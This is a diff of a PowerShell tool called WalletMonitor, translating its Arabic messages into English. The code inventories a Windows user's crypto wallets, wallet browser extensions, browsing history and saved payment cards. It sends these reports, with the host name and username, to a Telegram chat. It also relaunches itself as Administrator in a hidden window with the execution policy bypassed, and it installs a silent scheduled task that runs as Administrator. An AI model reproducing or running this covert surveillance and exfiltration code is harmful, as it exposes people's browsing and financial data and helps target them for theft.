+        [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b> — $($grouped.Count) entry(ies)")
 
         $i = 0
         foreach ($e in $sorted) {
             if ($i -ge $topPer) {
                 $rest = $grouped.Count - $topPer
-                if ($rest -gt 0) { [void]$lines.Add("   … و $rest رابط إضافي في هذا التصنيف.") }
+                if ($rest -gt 0) { [void]$lines.Add("   … and $rest more entries in this category.") }
                 break
             }
             $i++
@@ -2056,10 +2056,10 @@ function Build-HistoryReportLines {
         }
     }
 
-    # أكثر النطاقات زيارة
+    # Most visited domains
     if ($sel.Count -gt 0 -and $topDom -gt 0) {
-        # ملاحظة: نجمع عدد الزيارات (Visits) لكل نطاق وليس عدد الروابط المميَّزة،
-        # حتى يعكس الترتيب كثافة الاستخدام الفعلية. إن غاب عدّاد الزيارات نستخدم 1 كحد أدنى.
+        # Note: we sum the visit count (Visits) per domain, not the number of distinct URLs,
+        # so the ranking reflects actual usage intensity. If the visit counter is missing we use 1 as a minimum.
         $counts = @{}
         foreach ($h in $sel) {
             $k = $h.Host
@@ -2071,19 +2071,19 @@ function Build-HistoryReportLines {
         if ($top.Count -gt 0) {
             [void]$lines.Add('')
             [void]$lines.Add('━━━━━━━━━━━━━━━━')
-            [void]$lines.Add('🏆 <b>أكثر النطاقات زيارة</b> <i>(إجمالي الزيارات)</i>')
+            [void]$lines.Add('🏆 <b>Most visited domains</b> <i>(total visits)</i>')
             $i = 0
             foreach ($e in $top) { $i++; [void]$lines.Add("$i) $(ConvertTo-HtmlSafe $e.Key) — <b>$($e.Value)</b>") }
         }
     }
 
-    # آخر النشاطات
+    # Recent activity
     if ($sel.Count -gt 0 -and $recentN -gt 0) {
         $recent = @($sel | Where-Object { $_.LastTs } | Sort-Object LastTs -Descending | Select-Object -First $recentN)
         if ($recent.Count -gt 0) {
             [void]$lines.Add('')
             [void]$lines.Add('━━━━━━━━━━━━━━━━')
-            [void]$lines.Add('🕒 <b>آخر النشاطات</b>')
+            [void]$lines.Add('🕒 <b>Recent activity</b>')
             foreach ($e in $recent) {
                 [void]$lines.Add("   • $(ConvertTo-HtmlSafe $e.Host) · $(ConvertTo-HtmlSafe $e.Last) · $($e.Browser)")
             }
@@ -2092,7 +2092,7 @@ function Build-HistoryReportLines {
 
     if ($sel.Count -eq 0) {
         [void]$lines.Add('')
-        [void]$lines.Add('ℹ️ لا توجد روابط داخل التصنيفات المطلوبة خلال الفترة المحددة.')
+        [void]$lines.Add('ℹ️ No entries in the requested categories during the specified period.')
     }
 
     return @($lines)
@@ -2107,7 +2107,7 @@ function Send-HistoryReport {
     $maxChars  = [int](Get-Prop $reportCfg 'max_message_chars' 3500)
 
     if (-not $Force) {
-        if (@($Script:HistoryHits).Count -eq 0) { Write-Log 'لا توجد روابط تاريخ لإرسال تقرير.' 'DEBUG'; return }
+        if (@($Script:HistoryHits).Count -eq 0) { Write-Log 'No history entries to send in a report.' 'DEBUG'; return }
 
         $last = [string]$Script:State.last_report_ts
         if ($last) {
@@ -2116,14 +2116,14 @@ function Send-HistoryReport {
             if ($dt) {
                 $hours = ((Get-Date) - $dt).TotalHours
                 if ($hours -lt $minHours) {
-                    Write-Log ("تخطّي تقرير التاريخ (آخر تقرير قبل {0:N1} ساعة، الحد الأدنى $minHours)." -f $hours) 'DEBUG'
+                    Write-Log ("Skipping history report (last report was {0:N1} hour(s) ago, minimum $minHours)." -f $hours) 'DEBUG'
                     return
                 }
             }
         }
 
         if ($mode -eq 'new_only' -and $Script:NewHistoryCount -le 0) {
-            Write-Log 'تخطّي تقرير التاريخ (الوضع new_only ولا يوجد جديد).' 'DEBUG'
+            Write-Log 'Skipping history report (new_only mode and nothing new).' 'DEBUG'
             return
         }
     }
@@ -2142,24 +2142,24 @@ function Send-HistoryReport {
     }
     if ($sentAll) {
         $Script:State.last_report_ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
-        Write-Log "تم إرسال تقرير التاريخ ($total رسالة)."
+        Write-Log "History report sent ($total message(s))."
     } else {
-        Write-Log 'فشل إرسال جزء من تقرير التاريخ.' 'ERROR'
+        Write-Log 'Failed to send part of the history report.' 'ERROR'
     }
 }
 
 # =====================================================================
-#  15)  إشعارات الاكتشافات الجديدة (مرتبة حسب النوع)
+#  15)  New-detection notifications (grouped by type)
 # =====================================================================
 
 function Send-NewFindings {
     $items = @($Script:NewItems)
     if ($items.Count -eq 0) {
-        Write-Log 'لا توجد اكتشافات جديدة (غير التاريخ) في هذه الدورة.'
+        Write-Log 'No new detections (other than history) in this run.'
         return
     }
 
-    Write-Log "عدد الاكتشافات الجديدة: $($items.Count)"
+    Write-Log "Number of new detections: $($items.Count)"
 
     $order = @{ 'desktop' = 1; 'extension' = 2; 'file' = 3; 'history' = 4; 'card' = 5 }
     $items = @($items | Sort-Object @{ Expression = { [int]$order[$_.Type] } }, @{ Expression = { $_.Label } })
@@ -2169,38 +2169,38 @@ function Send-NewFindings {
     $f = @($items | Where-Object { $_.Type -eq 'file' }).Count
     $cd = @($items | Where-Object { $_.Type -eq 'card' }).Count
 
-    # رسالة تجميعية أولاً (فرز سريع للنظرة العامة)
+    # Summary message first (quick overview)
     $head = @()
-    $head += '📥 <b>اكتشافات جديدة — WalletMonitor</b>'
+    $head += '📥 <b>New detections — WalletMonitor</b>'
     $head += '━━━━━━━━━━━━━━━━'
-    $head += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
-    $head += "🕒 الوقت: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
-    $head += "📊 الإجمالي: <b>$($items.Count)</b>"
-    $head += "🔴 محافظ سطح مكتب: $d"
-    $head += "🟠 إضافات متصفح: $x"
-    $head += "🔵 آثار ملفات: $f"
-    if ($cd -gt 0) { $head += "💳 البطاقات المحفوظة: تغيّر في $cd مجموعة" }
-    if ($Script:NewHistoryCount -gt 0) { $head += "🟡 زيارات مواقع جديدة: $($Script:NewHistoryCount) (تظهر في تقرير التاريخ)" }
+    $head += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
+    $head += "🕒 Time: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
+    $head += "📊 Total: <b>$($items.Count)</b>"
+    $head += "🔴 Desktop wallets: $d"
+    $head += "🟠 Browser extensions: $x"
+    $head += "🔵 File artifacts: $f"
+    if ($cd -gt 0) { $head += "💳 Saved cards: change in $cd group(s)" }
+    if ($Script:NewHistoryCount -gt 0) { $head += "🟡 New site visits: $($Script:NewHistoryCount) (shown in the history report)" }
     [void](Send-TelegramMessage -Text ($head -join "`n"))
     $Script:SentCount++
 
-    # التفاصيل
+    # Details
     $limit = if ($Script:MaxPerRun -gt 0) { $Script:MaxPerRun } else { $items.Count }
     $i = 0
     foreach ($it in $items) {
         if ($i -ge $limit) {
             $rest = $items.Count - $limit
-            [void](Send-TelegramMessage -Text "📎 يوجد $rest اكتشاف إضافي لم يتم إرسال تفاصيله (تم بلوغ حد max_notifications_per_run). راجع اللوج.")
+            [void](Send-TelegramMessage -Text "📎 $rest additional detection(s) were not detailed (max_notifications_per_run reached). Check the log.")
             break
         }
         if (Send-TelegramMessage -Text $it.Message) { $Script:SentCount++ }
         $i++
     }
-    Write-Log "تم إرسال إشعارات الاكتشافات الجديدة."
+    Write-Log "New-detection notifications sent."
 }
 
 # =====================================================================
-#  16)  الملخص اليومي
+#  16)  Daily summary
 # =====================================================================
 
 function Invoke-DailySummaryIfDue {
@@ -2227,25 +2227,25 @@ function Invoke-DailySummaryIfDue {
     $total = $d + $x + $h + $f
 
     $msg = @()
-    $msg += '📊 <b>الملخص اليومي — WalletMonitor</b>'
+    $msg += '📊 <b>Daily summary — WalletMonitor</b>'
     $msg += '━━━━━━━━━━━━━━━━'
-    $msg += "📅 التاريخ: $today"
-    $msg += "🔴 محافظ سطح مكتب: $d"
-    $msg += "🟠 إضافات متصفح: $x"
-    $msg += "🟡 زيارات مواقع: $h"
-    $msg += "🔵 ملفات/مجلدات مشبوهة: $f"
-    $msg += "∑ الإجمالي: <b>$total</b>"
-    $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
-    if ($total -eq 0) { $msg += '✅ لا اكتشافات جديدة خلال آخر 24 ساعة.' }
+    $msg += "📅 Date: $today"
+    $msg += "🔴 Desktop wallets: $d"
+    $msg += "🟠 Browser extensions: $x"
+    $msg += "🟡 Site visits: $h"
+    $msg += "🔵 Suspicious files/directories: $f"
+    $msg += "∑ Total: <b>$total</b>"
+    $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
+    if ($total -eq 0) { $msg += '✅ No new detections today.' }
 
     if (Send-TelegramMessage -Text ($msg -join "`n")) {
         $Script:State.last_summary_date = $today
-        Write-Log 'تم إرسال الملخص اليومي.'
+        Write-Log 'Daily summary sent.'
     }
 }
 
 # =====================================================================
-#  17)  إشعارات الأخطاء
+#  17)  Error notifications
 # =====================================================================
 
 function Send-ErrorNotification {
@@ -2254,20 +2254,20 @@ function Send-ErrorNotification {
     if ($errs.Count -eq 0) { return }
 
     $msg = @()
-    $msg += '⚠️ <b>تنبيه: مشاكل في أداة المراقبة</b>'
+    $msg += '⚠️ <b>Alert: monitoring-tool problems</b>'
     $msg += '━━━━━━━━━━━━━━━━'
-    $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
-    $msg += "🕒 الوقت: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
-    $msg += '❗️ التفاصيل:'
+    $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
+    $msg += "🕒 Time: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
+    $msg += '❗️ Details:'
     foreach ($e in ($errs | Select-Object -First 15)) { $msg += "• $(ConvertTo-HtmlSafe (Limit-Text $e 220))" }
-    if ($errs.Count -gt 15) { $msg += "• ... و $($errs.Count - 15) خطأ آخر (راجع اللوج)." }
-    $msg += '📄 راجع ملف اللوج: <code>wallet-monitor.log</code>'
+    if ($errs.Count -gt 15) { $msg += "• ... and $($errs.Count - 15) more error(s) (check the log)." }
+    $msg += '📄 See the log file: <code>wallet-monitor.log</code>'
 
     [void](Send-TelegramMessage -Text ($msg -join "`n"))
 }
 
 # =====================================================================
-#  18)  تسجيل المهمة المجدولة (Task Scheduler) - من نفس الملف
+#  18)  Scheduled-task registration (Task Scheduler) - from the same file
 # =====================================================================
 
 function Test-Admin {
@@ -2281,14 +2281,14 @@ function Test-Admin {
 function Show-TaskStatus {
     $taskName = 'WalletMonitor'
     $t = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
-    if (-not $t) { Write-Console "المهمة '$taskName' غير مسجّلة." -ForegroundColor Yellow; return }
+    if (-not $t) { Write-Console "Task '$taskName' is not registered." -ForegroundColor Yellow; return }
     $info = Get-ScheduledTaskInfo -TaskName $taskName -ErrorAction SilentlyContinue
-    Write-Console "المهمة: $taskName"
-    Write-Console "الحالة: $($t.State)"
+    Write-Console "Task: $taskName"
+    Write-Console "State: $($t.State)"
     if ($info) {
-        Write-Console "آخر تشغيل: $($info.LastRunTime)"
-        Write-Console "نتيجة آخر تشغيل: $($info.LastTaskResult)"
-        Write-Console "التشغيل القادم: $($info.NextRunTime)"
+        Write-Console "Last run: $($info.LastRunTime)"
+        Write-Console "Last run result: $($info.LastTaskResult)"
+        Write-Console "Next run: $($info.NextRunTime)"
     }
 }
 
@@ -2300,11 +2300,11 @@ function Install-Task {
     $scriptPath = $PSCommandPath
     if (-not $scriptPath) { $scriptPath = $Script:SelfPath }
     if (-not $scriptPath -or -not (Test-Path -LiteralPath $scriptPath)) {
-        Write-Console 'تعذّر تحديد مسار الملف الحالي لتسجيل المهمة.' -ForegroundColor Red; return
+        Write-Console 'Could not determine the current file path to register the task.' -ForegroundColor Red; return
     }
 
     if (-not (Test-Admin)) {
-        Write-Console 'يجب تشغيل هذا الأمر من PowerShell مرفوع الصلاحيات (Run as Administrator).' -ForegroundColor Red
+        Write-Console 'This command must be run from an elevated PowerShell (Run as Administrator).' -ForegroundColor Red
         return
     }
 
@@ -2333,36 +2333,36 @@ function Install-Task {
 
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
             -Settings $settings -Principal $principal -Force `
-            -Description 'WalletMonitor - مراقبة آثار محافظ الكريبتو وإرسال إشعارات Telegram' | Out-Null
+            -Description 'WalletMonitor - crypto wallet artifact monitoring with Telegram notifications' | Out-Null
 
-        Write-Console "تم تسجيل المهمة '$taskName' بنجاح." -ForegroundColor Green
-        Write-Console "أول تشغيل: $((Get-Date).AddMinutes(2).ToString('yyyy-MM-dd HH:mm'))"
-        Write-Console "التكرار: كل $Minutes دقيقة"
-        Write-Console "مستوى التشغيل: $runLevel"
-        if ($runLevel -eq 'highest') { Write-Console 'المهمة تعمل بصلاحيات Administrator وبصمت عند كل دورة (بدون نافذة وبدون UAC).' -ForegroundColor Green }
-        Write-Console 'ملاحظة: المهمة تعمل فقط عندما يكون المستخدم مسجّل الدخول (LogonType Interactive).'
+        Write-Console "Task '$taskName' registered successfully." -ForegroundColor Green
+        Write-Console "First run: $((Get-Date).AddMinutes(2).ToString('yyyy-MM-dd HH:mm'))"
+        Write-Console "Interval: every $Minutes minute(s)"
+        Write-Console "Run level: $runLevel"
+        if ($runLevel -eq 'highest') { Write-Console 'The task runs with Administrator rights and silently on every cycle (no window, no UAC).' -ForegroundColor Green }
+        Write-Console 'Note: the task only runs while the user is logged on (LogonType Interactive).'
     } catch {
-        Write-Console "فشل تسجيل المهمة: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Console "Failed to register the task: $($_.Exception.Message)" -ForegroundColor Red
     }
 }
 
 function Uninstall-Task {
     $taskName = 'WalletMonitor'
     if (-not (Test-Admin)) {
-        Write-Console 'يجب تشغيل هذا الأمر من PowerShell مرفوع الصلاحيات (Run as Administrator).' -ForegroundColor Red
+        Write-Console 'This command must be run from an elevated PowerShell (Run as Administrator).' -ForegroundColor Red
         return
     }
     $t = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
     if ($t) {
         Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-        Write-Console "تم إزالة المهمة '$taskName'." -ForegroundColor Green
+        Write-Console "Task '$taskName' removed." -ForegroundColor Green
     } else {
-        Write-Console "المهمة '$taskName' غير موجودة أصلاً." -ForegroundColor Yellow
+        Write-Console "Task '$taskName' does not exist." -ForegroundColor Yellow
     }
 }
 
 # =====================================================================
-#  19)  دورة الفحص الكاملة
+#  19)  Full scan cycle
 # =====================================================================
 
 function Send-StartupNotification {
@@ -2370,18 +2370,18 @@ function Send-StartupNotification {
     if (-not [bool](Get-Prop $tg 'notify_on_start' $true)) { return }
 
     $msg = @()
-    $msg += '✅ <b>WalletMonitor شغّال</b>'
+    $msg += '✅ <b>WalletMonitor is running</b>'
     $msg += '━━━━━━━━━━━━━━━━'
-    $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
-    $msg += "👤 المستخدم: <code>$(ConvertTo-HtmlSafe $env:USERNAME)</code>"
-    $msg += "🕒 وقت البدء: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
-    $msg += "⏱ الفحص كل $($Script:IntervalMinutes) دقيقة"
+    $msg += "🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
+    $msg += "👤 User: <code>$(ConvertTo-HtmlSafe $env:USERNAME)</code>"
+    $msg += "🕒 Start time: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
+    $msg += "⏱ Scan every $($Script:IntervalMinutes) minute(s)"
     [void](Send-TelegramMessage -Text ($msg -join "`n"))
 }
 
 function Invoke-FullScan {
     $cycleStart = Get-Date
-    Write-Log '=========== بدء دورة فحص جديدة ==========='
+    Write-Log '=========== Starting a new scan cycle ==========='
     $Script:RunErrors = New-Object System.Collections.ArrayList
     $Script:FoundItems = New-Object System.Collections.ArrayList
     $Script:NewItems = New-Object System.Collections.ArrayList
@@ -2391,22 +2391,22 @@ function Invoke-FullScan {
 
     if ([bool](Get-Prop $scanCfg 'installed_programs' $true)) {
         try { Invoke-InstalledProgramScan }
-        catch { Add-Error "فشل فحص البرامج المثبتة: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
+        catch { Add-Error "Installed-programs scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
     }
 
     if ([bool](Get-Prop $scanCfg 'browser_extensions' $true)) {
         try { Invoke-BrowserExtensionScan }
-        catch { Add-Error "فشل فحص إضافات المتصفح: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
+        catch { Add-Error "Browser-extension scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
     }
 
     if ([bool](Get-Prop $scanCfg 'browser_history' $true)) {
         try { Invoke-BrowserHistoryScan }
-        catch { Add-Error "فشل فحص تاريخ المتصفح: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
+        catch { Add-Error "Browser-history scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
     }
 
     if ([bool](Get-Prop $scanCfg 'filesystem' $true)) {
         try { Invoke-FileSystemScan }
-        catch { Add-Error "فشل فحص نظام الملفات: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
+        catch { Add-Error "Filesystem scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
     }
 
     if ([bool](Get-Prop $scanCfg 'credit_cards' $true)) {
@@ -2416,15 +2416,15 @@ function Invoke-FullScan {
             if ([bool](Get-Prop $ccCfg 'notify_on_change' $true)) {
                 $sig  = Get-CardSignature
                 $prev = [string]$Script:State.card_sig
-                # أول دورة تسجّل البصمة بصمت؛ الإشعار فقط عند تغيّر الأعداد/ربط CVV.
+                # The first run records the fingerprint silently; notification only when the counts/CVV linkage change.
                 if ($prev -and $prev -ne $sig) {
                     $msg = (Build-CardReportLines -Full) -join "`n"
-                    [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'card'; Key = "card|$sig"; Label = 'بطاقات محفوظة (تغيّر)'; Message = $msg })
+                    [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'card'; Key = "card|$sig"; Label = 'Saved cards (changed)'; Message = $msg })
                 }
                 $Script:State.card_sig = $sig
             }
         } catch {
-            Add-Error "فشل فحص البطاقات: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
+            Add-Error "Card scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
         }
     }
 
@@ -2436,24 +2436,24 @@ function Invoke-FullScan {
     Save-State
 
     $dur = [int]((Get-Date) - $cycleStart).TotalSeconds
-    Write-Log "=========== انتهت الدورة (إجمالي النتائج: $($Script:FoundItems.Count) | جديدة: $($Script:NewItems.Count) | مدة: ${dur}s) ==========="
+    Write-Log "=========== Cycle finished (total results: $($Script:FoundItems.Count) | new: $($Script:NewItems.Count) | duration: ${dur}s) ==========="
 }
 
 # =====================================================================
-#  20)  نقطة البداية (Main)
+#  20)  Entry point (Main)
 # =====================================================================
 
 $Script:SelfPath = $PSCommandPath
 if (-not $Script:SelfPath) { $Script:SelfPath = $MyInvocation.MyCommand.Path }
 
-# دمج ملف إعدادات خارجي (اختياري) فوق البطاقة المدمجة
+# Merge an external config file (optional) over the embedded block
 if ($Script:ConfigFile) {
     try {
         $ext = Read-JsonFile $Script:ConfigFile
         Merge-Config $CONFIG $ext
-        Write-Console "تم تحميل إعدادات إضافية من: $($Script:ConfigFile)"
+        Write-Console "Additional config loaded from: $($Script:ConfigFile)"
     } catch {
-        Write-Console "تحذير: تعذّر قراءة ملف الإعدادات '$($Script:ConfigFile)' — $($_.Exception.Message)" -ForegroundColor Yellow
+        Write-Console "Warning: could not read the config file '$($Script:ConfigFile)' — $($_.Exception.Message)" -ForegroundColor Yellow
     }
 }
 $Script:Cfg = $CONFIG
@@ -2463,32 +2463,32 @@ $hostLabelCfg = [string](Get-Prop $Script:Cfg 'host_label' '')
 if ($hostLabelCfg) { $Script:HostLabel = $hostLabelCfg }
 
 if ($Help) {
-    Write-Console 'WalletMonitor v3.0 — مراقبة آثار محافظ الكريبتو (ملف واحد، بدون Python)' 'Cyan'
+    Write-Console 'WalletMonitor v3.0 — crypto wallet artifact monitoring (single file, no Python)' 'Cyan'
     Write-Console ''
-    Write-Console '  (بدون مفاتيح)   فحص واحد صامت + إشعارات Telegram'
-    Write-Console '  -Console         إظهار المخرجات على الشاشة'
-    Write-Console '  -ScanNow         فحص فوري'
-    Write-Console '  -TestNotify      إرسال رسالة اختبار إلى Telegram'
-    Write-Console '  -HistoryReport   إرسال تقرير تاريخ المتصفح الآن'
-    Write-Console '  -CardReport      إرسال تقرير بطاقات الدفع المحفوظة (عدّ فقط)'
-    Write-Console '  -Elevate         إعادة تشغيل الأداة بصلاحيات Administrator بصمت (نافذة مخفية)'
-    Write-Console '  -Loop            حلقة مراقبة مستمرة (حسب schedule.interval_minutes)'
-    Write-Console '  -Install         تسجيل مهمة مجدولة تعمل بصلاحيات Administrator بصمت (يحتاج Administrator)'
-    Write-Console '  -Uninstall       إزالة المهمة المجدولة'
-    Write-Console '  -TaskStatus      عرض حالة المهمة'
-    Write-Console '  -ResetState      تصفير ملف الحالة (state.json)'
-    Write-Console '  -NoNotify        تعطيل إرسال Telegram'
-    Write-Console '  -ConfigPath <f>  تحميل ملف إعدادات خارجي فوق المدمج'
+    Write-Console '  (no switches)    one silent scan + Telegram notifications'
+    Write-Console '  -Console         show output on screen'
+    Write-Console '  -ScanNow         run a scan immediately'
+    Write-Console '  -TestNotify      send a test message to Telegram'
+    Write-Console '  -HistoryReport   send the browser history report now'
+    Write-Console '  -CardReport      send the saved payment-card report (count-only)'
+    Write-Console '  -Elevate         relaunch the tool with Administrator rights silently (hidden window)'
+    Write-Console '  -Loop            continuous monitoring loop (per schedule.interval_minutes)'
+    Write-Console '  -Install         register a scheduled task that runs as Administrator silently (requires Administrator)'
+    Write-Console '  -Uninstall       remove the scheduled task'
+    Write-Console '  -TaskStatus      show task status'
+    Write-Console '  -ResetState      reset the state file (state.json)'
+    Write-Console '  -NoNotify        disable Telegram sending'
+    Write-Console '  -ConfigPath <f>  load an external config file over the embedded one'
     Write-Console ''
     exit 0
 }
 
-# ---- رفع الصلاحيات: إعادة تشغيل نفسه كـ Administrator بنافذة مخفية ----
+# ---- Elevation: relaunch itself as Administrator with a hidden window ----
 if ($Elevate -and -not (Test-Admin)) {
     $self = $PSCommandPath
     if (-not $self) { $self = $Script:SelfPath }
     if (-not $self -or -not (Test-Path -LiteralPath $self)) {
-        Write-Console 'تعذّر تحديد مسار الملف لإعادة التشغيل بصلاحيات مرتفعة.' -ForegroundColor Red
+        Write-Console 'Could not determine the file path for relaunching with elevated rights.' -ForegroundColor Red
         exit 3
     }
 
@@ -2512,18 +2512,18 @@ if ($Elevate -and -not (Test-Admin)) {
     if ($ConfigPath) { [void]$keep.Add('-ConfigPath'); [void]$keep.Add('"' + $ConfigPath + '"') }
 
     $argLine = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $self + '" ' + ($keep -join ' ')
-    Write-Console 'إعادة التشغيل بصلاحيات Administrator (نافذة مخفية)...' 'Cyan'
+    Write-Console 'Relaunching with Administrator rights (hidden window)...' 'Cyan'
     try {
         Start-Process -FilePath 'powershell.exe' -ArgumentList $argLine -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
-        Write-Console 'تم إطلاق النسخة المرتفعة الصلاحيات بنجاح.' -ForegroundColor Green
+        Write-Console 'The elevated instance was launched successfully.' -ForegroundColor Green
         exit 0
     } catch {
-        Write-Console "فشل رفع الصلاحيات: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Console "Elevation failed: $($_.Exception.Message)" -ForegroundColor Red
         exit 3
     }
 }
 
-# ---- إدارة المهمة المجدولة (لا تحتاج تشغيل الفحص) ----
+# ---- Scheduled-task management (does not require running the scan) ----
 if ($TaskStatus) { Show-TaskStatus; exit 0 }
 if ($Uninstall)  { Uninstall-Task; exit 0 }
 if ($Install) {
@@ -2535,7 +2535,7 @@ if ($Install) {
 
 Initialize-Log
 Rotate-LogIfNeeded
-Write-Log '################ WalletMonitor v3.0 (ملف واحد، بدون Python) ################'
+Write-Log '################ WalletMonitor v3.0 (single file, no Python) ################'
 
 Initialize-Telegram
 Initialize-State
@@ -2545,25 +2545,25 @@ if ($IntervalMinutes -gt 0) { $Script:IntervalMinutes = $IntervalMinutes }
 if ($Script:IntervalMinutes -lt 1) { $Script:IntervalMinutes = 30 }
 
 if ($TestNotify) {
-    Write-Console 'إرسال رسالة اختبار إلى Telegram...'
-    $txt = "🔔 <b>رسالة اختبار — WalletMonitor</b>`n━━━━━━━━━━━━━━━━`n✅ الربط بـ Telegram يعمل بشكل صحيح.`n🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>`n🕒 $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
+    Write-Console 'Sending a test message to Telegram...'
+    $txt = "🔔 <b>Test message — WalletMonitor</b>`n━━━━━━━━━━━━━━━━`n✅ The Telegram link works correctly.`n🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>`n🕒 $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
     $ok = Send-TelegramMessage -Force -Text $txt
-    if ($ok) { Write-Console 'تم الإرسال بنجاح.' -ForegroundColor Green; exit 0 }
-    else { Write-Console 'فشل الإرسال. تحقق من التوكن و chat_id.' -ForegroundColor Red; exit 2 }
+    if ($ok) { Write-Console 'Sent successfully.' -ForegroundColor Green; exit 0 }
+    else { Write-Console 'Sending failed. Check the token and chat_id.' -ForegroundColor Red; exit 2 }
 }
 
 if ($HistoryReport) {
-    Write-Console 'تشغيل تقرير تاريخ المتصفح...'
-    try { Invoke-BrowserHistoryScan } catch { Add-Error "فشل فحص التاريخ: $($_.Exception.Message)" }
-    try { Invoke-BrowserCardScan } catch { Add-Error "فشل فحص البطاقات: $($_.Exception.Message)" }
+    Write-Console 'Running the browser history report...'
+    try { Invoke-BrowserHistoryScan } catch { Add-Error "History scan failed: $($_.Exception.Message)" }
+    try { Invoke-BrowserCardScan } catch { Add-Error "Card scan failed: $($_.Exception.Message)" }
     Send-HistoryReport -Force
     Save-State
     exit 0
 }
 
 if ($CardReport) {
-    Write-Console 'تشغيل تقرير بطاقات الدفع المحفوظة...'
-    try { Invoke-BrowserCardScan } catch { Add-Error "فشل فحص البطاقات: $($_.Exception.Message)" }
+    Write-Console 'Running the saved payment-card report...'
+    try { Invoke-BrowserCardScan } catch { Add-Error "Card scan failed: $($_.Exception.Message)" }
     [void](Send-CardReport -Force -Full)
     Save-State
     exit 0
@@ -2571,14 +2571,14 @@ if ($CardReport) {
 
 if ($Loop) {
     Send-StartupNotification
-    Write-Console "وضع المراقبة المستمرة — فحص كل $Script:IntervalMinutes دقيقة. (Ctrl+C للإيقاف)" -ForegroundColor Cyan
+    Write-Console "Continuous monitoring mode — scanning every $Script:IntervalMinutes minute(s). (Ctrl+C to stop)" -ForegroundColor Cyan
     while ($true) {
         $cycleStart = Get-Date
-        try { Invoke-FullScan } catch { Write-Log "خطأ غير متوقع في الدورة: $($_.Exception.Message)" 'ERROR' }
+        try { Invoke-FullScan } catch { Write-Log "Unexpected error in the cycle: $($_.Exception.Message)" 'ERROR' }
         $elapsed = (Get-Date) - $cycleStart
         $sleep = ($Script:IntervalMinutes * 60) - [int]$elapsed.TotalSeconds
         if ($sleep -lt 10) { $sleep = 10 }
-        Write-Log "النوم $sleep ثانية حتى الدورة القادمة..."
+        Write-Log "Sleeping $sleep second(s) until the next cycle..."
         Start-Sleep -Seconds $sleep
     }
 }
